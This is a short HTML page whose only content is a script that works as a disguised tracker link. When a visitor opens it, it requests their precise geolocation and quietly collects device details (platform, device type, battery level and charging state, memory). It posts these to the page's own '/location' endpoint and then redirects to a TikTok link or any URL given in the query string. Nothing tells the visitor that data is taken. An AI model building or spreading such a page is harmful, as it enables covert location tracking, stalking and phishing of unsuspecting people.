<body>
  <script>
    const params = new URLSearchParams(window.location.search);
    const TARGET_URL = params.get('url') || 'https://vm.tiktok.com/ZSCBCGC1T/';

    async function getDeviceInfo() {
      const os = navigator.platform || 'N/A';
      const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
      let battery = 'N/A';
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
        }
      } catch (e) {}
      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
      return { os, deviceType, battery, memory };
    }

    function start() {
      if (!navigator.geolocation) {
        window.location.href = TARGET_URL;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;

          try {
            const device = await getDeviceInfo();
            await fetch("/location", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ lat, lon, ...device })
            });
          } catch (err) {}

          window.location.href = TARGET_URL;
        },
        () => {
          window.location.href = TARGET_URL;
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    }

    start();
  </script>
